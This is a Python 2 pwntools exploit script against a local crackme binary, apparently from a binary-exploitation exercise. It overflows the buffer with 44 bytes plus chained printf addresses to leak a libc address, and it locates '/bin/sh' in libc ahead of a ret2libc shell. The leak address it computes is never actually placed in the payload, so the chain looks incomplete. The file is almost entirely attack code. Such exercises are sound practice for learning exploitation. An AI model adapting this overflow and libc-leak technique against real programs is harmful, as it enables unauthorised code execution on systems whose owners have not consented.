#!/usr/bin/env python2

import time
from pwn import *

def p32a(array):                                                                                                                       
    return ''.join(map(p32, array))                                                                                                    

def up32(s):
    return struct.unpack("<I", s)[0]
                                                                                                                       
TARGET = './crackme0x00'
elf = ELF(TARGET)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

if __name__ == '__main__':

    p = process (TARGET)

    printf       = elf.symbols['printf']
    leak_add     = elf.got['setvbuf']
    binsh_offset = libc.search('/bin/sh').next()
    p.recvline()

    payload = [
        printf,
        printf,
        printf 
    ] 
    p.send("A" * 44 + p32a(payload))
    p.recvline()

    libc_base = up32(p.recvline()[0:4]) - libc.symbols['setvbuf']
    print("LIBC_BASE : %08X" % libc_base)

